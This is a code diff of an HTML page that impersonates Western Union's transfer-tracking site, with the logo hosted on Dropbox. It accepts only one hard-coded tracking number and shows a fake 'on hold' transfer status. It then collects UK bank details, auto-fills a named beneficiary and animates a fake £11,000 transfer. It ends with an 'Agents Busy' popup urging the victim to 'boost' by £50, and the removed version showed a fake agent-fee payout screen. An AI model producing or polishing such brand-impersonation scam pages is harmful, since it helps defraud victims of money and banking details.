@@ -3,239 +3,666 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Transfer Management | Western Union</title>
+    <title>Track a Transfer | Western Union</title>
     <style>
         :root {
-            --wu-blue: #0055a5;
             --wu-yellow: #ffda00;
             --wu-black: #000000;
+            --wu-blue: #0055a5;
             --wu-grey: #666666;
+            --wu-light-grey: #f5f5f5;
         }
 
         body {
-            font-family: 'Roboto', Arial, sans-serif;
+            font-family: 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             margin: 0;
-            background: #fff;
-        }
-
-        /* Full Screen Spinner Container */
-        #loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: #ffffff;
-            z-index: 9999;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        /* Logo in the middle of spinner */
-        .spinner-wrapper {
-            position: relative;
-            width: 120px;
-            height: 120px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .spinner-wrapper img {
-            width: 60px;
-            height: auto;
-            position: absolute;
-            z-index: 2;
-        }
-
-        .loader-ring {
-            width: 100px;
-            height: 100px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--wu-blue);
-            border-radius: 50%;
-            animation: spin 1.2s linear infinite;
-        }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .loading-text {
-            margin-top: 25px;
-            font-size: 18px;
-            font-weight: 500;
+            padding: 0;
+            background-color: #ffffff;
             color: var(--wu-black);
-            font-family: 'Montserrat', sans-serif;
         }
 
-        /* Agent Modal Pop-up */
-        .modal-bg {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 10000;
-            align-items: center;
+        /* Header */
+        .header {
+            background-color: var(--wu-black);
+            padding: 16px;
+            display: flex;
             justify-content: center;
+            align-items: center;
+            position: relative;
+            height: 60px;
         }
 
-        .agent-modal {
-            background: #fff;
-            width: 90%;
-            max-width: 400px;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+        .header-logo {
+            height: 40px;
+            width: auto;
+            object-fit: contain;
         }
 
-        .modal-header {
-            background: var(--wu-black);
+        .menu-button {
+            position: absolute;
+            right: 16px;
+            background-color: transparent;
+            border: 1px solid #fff;
             color: #fff;
-            padding: 20px;
-            text-align: center;
-            font-weight: bold;
-        }
-
-        .modal-content {
-            padding: 25px;
-        }
-
-        .agent-status {
-            color: #2e7d32;
+            padding: 8px 12px;
             font-size: 14px;
-            margin-bottom: 20px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        /* Banner */
+        .banner {
+            background-color: #fff;
+            padding: 16px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            border-bottom: 1px solid #e0e0e0;
         }
 
-        .row {
+        .banner img {
+            height: 60px;
+            margin-right: 16px;
+        }
+
+        .banner-text {
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .banner-text a {
+            color: var(--wu-blue);
+            text-decoration: none;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 24px 16px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 24px;
+        }
+
+        .language-selector {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: var(--wu-blue);
+            cursor: pointer;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid #e0e0e0;
+            margin-bottom: 24px;
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px 0;
+            font-size: 16px;
+            color: var(--wu-grey);
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+
+        .tab.active {
+            color: var(--wu-black);
+            border-bottom-color: var(--wu-blue);
+            font-weight: 500;
+        }
+
+        .tab-icon {
+            margin-right: 8px;
+        }
+
+        .input-label {
+            font-size: 16px;
+            margin-bottom: 16px;
+            display: block;
+        }
+
+        /* MTCN Input Styling */
+        .mtcn-input-container {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 12px;
-            font-size: 15px;
-            border-bottom: 1px solid #eee;
-            padding-bottom: 8px;
+            margin-bottom: 32px;
+            gap: 4px;
         }
 
-        .row.total {
-            border-bottom: none;
-            font-weight: bold;
-            font-size: 18px;
-            margin-top: 15px;
-        }
-
-        .agent-com {
-            color: #d32f2f;
-            font-weight: bold;
-        }
-
-        .continue-btn {
+        .mtcn-box {
             width: 100%;
-            padding: 15px;
-            margin-top: 20px;
-            background: #ccc;
-            color: #777;
+            max-width: 40px;
+            height: 40px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            text-align: center;
+            font-size: 18px;
+            padding: 0;
+            border-radius: 0;
+            background: transparent;
+        }
+
+        .mtcn-box:focus {
+            outline: none;
+            border-bottom: 2px solid var(--wu-blue);
+        }
+
+        .continue-button {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--wu-blue);
+            color: #fff;
             border: none;
             border-radius: 4px;
-            font-weight: bold;
-            cursor: not-allowed;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .continue-button:hover {
+            background-color: #004488;
+        }
+
+        .dont-know-link {
+            display: block;
+            text-align: center;
+            margin-top: 16px;
+            color: var(--wu-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        /* Footer */
+        .footer {
+            padding: 24px 16px;
+            background-color: #fff;
+            border-top: 1px solid #e0e0e0;
+            font-size: 12px;
+            color: var(--wu-grey);
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+
+        .footer-links a {
+            color: var(--wu-grey);
+            text-decoration: none;
+            margin: 0 8px 8px 0;
+        }
+
+        .footer-text {
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        /* Spinner Overlay */
+        .spinner-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.98);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .spinner-logo {
+            height: 60px;
+            width: auto;
+            margin-bottom: 20px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .spinner-text {
+            font-size: 18px;
+            color: var(--wu-black);
+            margin-top: 16px;
+            margin-bottom: 24px;
+            font-weight: 500;
+            line-height: 1.5;
+        }
+
+        /* Progress Bar */
+        .progress-wrapper {
+            width: 100%;
+            max-width: 400px;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+            height: 10px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: var(--wu-yellow);
+            transition: width 0.2s linear;
+        }
+
+        .progress-status {
+            font-size: 14px;
+            color: var(--wu-grey);
+        }
+
+        /* Transcript Page */
+        .transcript-page {
+            display: none;
+            padding: 24px 16px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .transcript-header {
+            border-bottom: 1px solid #ccc;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .transcript-item {
+            padding: 16px;
+            border-left: 4px solid #e0e0e0;
+            margin-bottom: 16px;
+            background: #f9f9f9;
+        }
+
+        .transcript-item.active {
+            border-left-color: var(--wu-blue);
+            background: #f0f7ff;
+        }
+
+        .transcript-status {
+            font-weight: 500;
+            margin-bottom: 4px;
             font-size: 16px;
         }
 
-        .error-note {
-            color: #d32f2f;
-            font-size: 12px;
-            text-align: center;
-            margin-top: 10px;
+        .transcript-date {
+            font-size: 14px;
+            color: var(--wu-grey);
         }
 
-        /* Placeholder for your actual UI button to trigger this */
-        .trigger-btn {
-            padding: 15px 30px;
-            background: var(--wu-blue);
-            color: #fff;
-            border: none;
-            cursor: pointer;
-            margin: 50px;
+        /* Bank Details Page */
+        .bank-details-page {
+            display: none;
+            padding: 24px 16px;
+            max-width: 800px;
+            margin: 0 auto;
         }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--wu-black);
+        }
+
+        .wu-input, .wu-select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box; /* Ensures padding doesn't affect width */
+        }
+
+        .wu-input:focus, .wu-select:focus {
+            border-color: var(--wu-blue);
+            outline: none;
+        }
+
+        /* Popup Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 24px;
+            border-radius: 8px;
+            max-width: 90%;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+
+        .modal-icon {
+            font-size: 40px;
+            margin-bottom: 16px;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+
+        .modal-body {
+            font-size: 16px;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .boost-btn {
+            background-color: var(--wu-yellow);
+            color: var(--wu-black);
+            font-weight: bold;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        .boost-btn:hover {
+            background-color: #e6c300;
+        }
+
     </style>
 </head>
 <body>
 
-    <div style="text-align: center;">
-        <button class="trigger-btn" onclick="startVerification()">Submit ID for Verification</button>
+    <div class="header">
+        <img src="https://www.dropbox.com/scl/fi/0zn5ptlnlwe50oj0gk23y/images-17.png?rlkey=j5jlej80dko50n71d21lqsjdr&st=ijuvo9l8&raw=1" alt="Western Union" class="header-logo">
+        <button class="menu-button">Menu</button>
     </div>
 
-    <div id="loading-overlay">
-        <div class="spinner-wrapper">
-            <img src="https://www.dropbox.com/scl/fi/0zn5ptlnlwe50oj0gk23y/images-17.png?rlkey=j5jlej80dko50n71d21lqsjdr&st=ijuvo9l8&raw=1" alt="Logo">
-            <div class="loader-ring"></div>
+    <div class="banner">
+        <img src="https://www.westernunion.com/content/dam/wu/images/wu-prepaid-card-visa.png" alt="WU Prepaid Card">
+        <div class="banner-text">
+            Skip the line and redirect your money transfer now to our prepaid card. $0 fees* for a limited time. <a href="#">Learn more</a>
         </div>
-        <div class="loading-text" id="load-msg">Initializing: Verifying ID...</div>
     </div>
 
-    <div class="modal-bg" id="agent-modal-bg">
-        <div class="agent-modal">
-            <div class="modal-header">
-                WESTERN UNION ONLINE AGENT
-            </div>
-            <div class="modal-content">
-                <div class="agent-status">
-                    <span style="height: 10px; width: 10px; background: #2e7d32; border-radius: 50%;"></span>
-                    Agent Connected - Session Active
-                </div>
-                
-                <div class="row">
-                    <span>Transfer Amount:</span>
-                    <span>£10,500.00</span>
-                </div>
-                <div class="row">
-                    <span>Bonus:</span>
-                    <span>£500.00</span>
-                </div>
-                <div class="row">
-                    <span>Agent Com:</span>
-                    <span class="agent-com">$80.00</span>
-                </div>
-                
-                <div class="row total">
-                    <span>Total Payout:</span>
-                    <span>£11,000.00</span>
-                </div>
+    <div class="main-content" id="tracking-page">
+        <div class="language-selector">
+            English/United States
+        </div>
 
-                <button class="continue-btn">Continue</button>
-                <div class="error-note">Payment has not been confirmed. Action Blocked.</div>
+        <h1>Track a Transfer</h1>
+
+        <div class="tabs">
+            <div class="tab active">
+                <span class="tab-icon">↑</span> I'm the sender
             </div>
+            <div class="tab">
+                <span class="tab-icon">↓</span> I'm the receiver
+            </div>
+        </div>
+
+        <label class="input-label">Please enter your 12-digit tracking number (MTCN).</label>
+
+        <div class="mtcn-input-container" id="mtcn-container">
+            </div>
+
+        <button class="continue-button" onclick="checkMTCN()">Continue</button>
+
+        <a href="#" class="dont-know-link">Don't know the MTCN?</a>
+    </div>
+
+    <div class="spinner-container" id="spinner">
+        <img src="https://www.dropbox.com/scl/fi/0zn5ptlnlwe50oj0gk23y/images-17.png?rlkey=j5jlej80dko50n71d21lqsjdr&st=ijuvo9l8&raw=1" alt="Loading..." class="spinner-logo">
+        <div class="spinner-text" id="spinner-text">Retrieving transfer details...</div>
+        
+        <div class="progress-wrapper" id="progress-wrapper" style="display:none;">
+            <div class="progress-bar" id="progress-bar"></div>
+        </div>
+        <div class="progress-status" id="progress-status" style="display:none;">Sending amount from merchant...</div>
+    </div>
+
+    <div class="transcript-page" id="transcript-page">
+        <h1 class="transcript-header">Transfer Status</h1>
+        <div class="transcript-item">
+            <div class="transcript-status">Money Sent</div>
+            <div class="transcript-date">October 26, 2023 - 10:15 AM</div>
+        </div>
+        <div class="transcript-item">
+            <div class="transcript-status">In Progress</div>
+            <div class="transcript-date">October 26, 2023 - 10:30 AM</div>
+        </div>
+        <div class="transcript-item active">
+            <div class="transcript-status" style="color: var(--wu-blue);">On Hold - Verification</div>
+            <div class="transcript-date">October 26, 2023 - 11:00 AM</div>
+            <div style="font-size: 14px; margin-top: 5px; color: #d32f2f;">Recipient bank details required</div>
+        </div>
+    </div>
+
+    <div class="bank-details-page" id="bank-details-page">
+        <h1>Enter Recipient Bank Details</h1>
+        <p style="margin-bottom: 24px; color: var(--wu-grey); font-size: 14px;">To release this transfer, please provide the bank account details where the funds should be deposited.</p>
+
+        <div class="form-group">
+            <label>Bank Name</label>
+            <select class="wu-select" id="bank-name">
+                <option value="" disabled selected>Select Bank</option>
+                <option value="LLOYDS BANK">Lloyds Bank</option>
+                <option value="BARCLAYS">Barclays</option>
+                <option value="HSBC">HSBC</option>
+                <option value="NATWEST">NatWest</option>
+                <option value="SANTANDER">Santander</option>
+                <option value="HALIFAX">Halifax</option>
+                <option value="RBS">Royal Bank of Scotland</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label>Sort Code</label>
+            <input type="text" class="wu-input" id="sort-code" maxlength="6" placeholder="123456" oninput="updateBeneficiary()">
+        </div>
+
+        <div class="form-group">
+            <label>Account Number</label>
+            <input type="text" class="wu-input" id="account-number" maxlength="8" placeholder="12345678" oninput="updateBeneficiary()">
+        </div>
+
+        <div class="form-group">
+            <label>Beneficiary Name</label>
+            <input type="text" class="wu-input" id="beneficiary-name" placeholder="" readonly style="background-color: #f5f5f5; color: #666; font-weight: bold;">
+        </div>
+        
+        <div style="margin-top: 20px; text-align: center;">
+             <img src="https://www.dropbox.com/scl/fi/0zn5ptlnlwe50oj0gk23y/images-17.png?rlkey=j5jlej80dko50n71d21lqsjdr&st=ijuvo9l8&raw=1" alt="WU" style="height: 20px; opacity: 0.5;">
+        </div>
+
+        <button class="continue-button" style="margin-top: 20px;" onclick="startTransferProcess()">Continue</button>
+    </div>
+
+    <div class="modal-overlay" id="boost-popup">
+        <div class="modal-content">
+            <div class="modal-icon">⚠️</div>
+            <div class="modal-title">Agents Busy</div>
+            <div class="modal-body">
+                All our agents are busy now. Boost amount by £50 to get your instant connection to an agent now.
+            </div>
+            <button class="boost-btn" onclick="handleBoost()">Boost Now</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Home</a> | <a href="#">About us</a> | <a href="#">Contact us</a> | <a href="#">Refer a Friend</a> | <a href="#">Blog</a> | <a href="#">Help</a> | <a href="#">Fraud awareness</a> | <a href="#">Report a security bug</a> | <a href="#">Investor relations</a> | <a href="#">Careers</a> | <a href="#">Western Union Foundation</a> | <a href="#">News</a> | <a href="#">Become an agent</a> | <a href="#">Payment solutions</a> | <a href="#">State licensing</a> | <a href="#">Law enforcement subpoena information</a> | <a href="#">Terms and Conditions</a> | <a href="#">Online Privacy Statement</a> | <a href="#">Sitemap</a> | <a href="#">Cookie Information</a> | <a href="#">Accessibility Statement</a> | <a href="#">How to find your WU tracking number</a> | <a href="#">Send money with confidence</a>
+        </div>
+        <div class="footer-text">
+            From 5/24-11/24, no fees for card purchase, card load and per transaction. Other fees apply, see Cardholder agreement for details. Western Union Prepaid Visa(R) Card is issued by Pathward(R), N.A. Member FDIC, pursuant to a license from Visa U.S.A. Inc. Once registered, card can be used anywhere Visa debit cards are accepted.
         </div>
     </div>
 
     <script>
-        function startVerification() {
-            const overlay = document.getElementById('loading-overlay');
-            const msg = document.getElementById('load-msg');
-            const modal = document.getElementById('agent-modal-bg');
+        // Generate 12 MTCN input boxes dynamically
+        const mtcnContainer = document.getElementById('mtcn-container');
+        for (let i = 0; i < 12; i++) {
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.maxLength = 1;
+            input.inputMode = 'numeric';
+            input.pattern = '[0-9]*';
+            input.className = 'mtcn-box';
             
-            // Show the loading screen
-            overlay.style.display = 'flex';
+            input.oninput = function() {
+                this.value = this.value.replace(/[^0-9]/g, ''); 
+                if (this.value.length === 1) {
+                    const next = this.nextElementSibling;
+                    if (next) next.focus();
+                }
+            };
 
-            // Timing variables (in milliseconds)
-            const VERIFY_TIME = 5000; // Set to 5000 for demo, use 300000 for 5 mins
-            const CONNECT_TIME = 3000; // Time for the "Connecting" phase
+            input.onkeydown = function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0) {
+                    const prev = this.previousElementSibling;
+                    if (prev) prev.focus();
+                }
+            };
+            mtcnContainer.appendChild(input);
+        }
 
-            // Phase 1: Verifying
-            setTimeout(() => {
-                // Phase 2: Connecting to Agent
-                msg.innerText = "Connecting you with a Western Union online agent...";
-                
+        // Logic for checking the specific MTCN
+        function checkMTCN() {
+            const inputs = document.querySelectorAll('.mtcn-box');
+            let mtcn = '';
+            inputs.forEach(input => mtcn += input.value);
+
+            if (mtcn === '243567183900') {
+                document.getElementById('tracking-page').style.display = 'none';
+                document.getElementById('spinner').style.display = 'flex';
+
+                // Initial load simulation
                 setTimeout(() => {
-                    // Phase 3: Show Pop-up
-                    overlay.style.display = 'none';
-                    modal.style.display = 'flex';
-                }, CONNECT_TIME);
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('transcript-page').style.display = 'block';
 
-            }, VERIFY_TIME);
+                    // Show Transcript for 3 seconds, then show Bank Form
+                    setTimeout(() => {
+                        document.getElementById('transcript-page').style.display = 'none';
+                        document.getElementById('bank-details-page').style.display = 'block';
+                    }, 3000);
+                }, 2500);
+            } else {
+                alert('We couldn\'t find a transfer with that MTCN. Please check the number and try again.');
+            }
+        }
+
+        // Auto-populate Name
+        function updateBeneficiary() {
+            const sortCode = document.getElementById('sort-code').value;
+            const accountNum = document.getElementById('account-number').value;
+            const nameField = document.getElementById('beneficiary-name');
+
+            // Determine if enough data is entered to "simulate" finding the user
+            if (sortCode.length >= 6 && accountNum.length >= 4) {
+                nameField.value = "JASVIR SINGH DHILLON";
+            } else {
+                nameField.value = "";
+            }
+        }
+
+        // Start the Transfer Process (The 8-time loop)
+        function startTransferProcess() {
+            const bankName = document.getElementById('bank-name').value;
+            const sortCode = document.getElementById('sort-code').value;
+            const accountNum = document.getElementById('account-number').value;
+            
+            if(!bankName || !sortCode || !accountNum) {
+                alert("Please complete all bank details.");
+                return;
+            }
+
+            // Hide form
+            document.getElementById('bank-details-page').style.display = 'none';
+            
+            // Show Spinner Overlay again
+            const spinner = document.getElementById('spinner');
+            const spinnerText = document.getElementById('spinner-text');
+            const progressBar = document.getElementById('progress-bar');
+            const progressWrapper = document.getElementById('progress-wrapper');
+            const progressStatus = document.getElementById('progress-status');
+
+            spinner.style.display = 'flex';
+            progressWrapper.style.display = 'block';
+            progressStatus.style.display = 'block';
+
+            // Set Initial Text
+            spinnerText.innerHTML = "Transferring £11,000 from western union agent(LLOYDS BANK) to JASVIR SINGH DHILLON<br>Please wait while we secure this transaction";
+            
+            let loopCount = 0;
+            const totalLoops = 8;
+            
+            function runLoop() {
+                if(loopCount >= totalLoops) {
+                    // Done looping, show popup
+                    document.getElementById('boost-popup').style.display = 'flex';
+                    return;
+                }
+
+                // Reset bar
+                progressBar.style.transition = 'none';
+                progressBar.style.width = '0%';
+                
+                // Toggle text based on interval (every other loop just to vary it, or keep consistent as requested)
+                if(loopCount % 2 === 0) {
+                    progressStatus.innerText = "Sending amount from merchant...";
+                } else {
+                    progressStatus.innerText = "Sending money from merchant...";
+                }
+
+                // Small delay to allow reset to render, then animate fill
+                setTimeout(() => {
+                    progressBar.style.transition = 'width 1.5s linear';
+                    progressBar.style.width = '100%';
+                }, 50);
+
+                // When animation finishes (approx 1.5s + buffer)
+                setTimeout(() => {
+                    loopCount++;
+                    runLoop();
+                }, 1600);
+            }
+
+            runLoop();
+        }
+
+        function handleBoost() {
+            alert("No boost initiated");
         }
     </script>
+
 </body>
 </html>
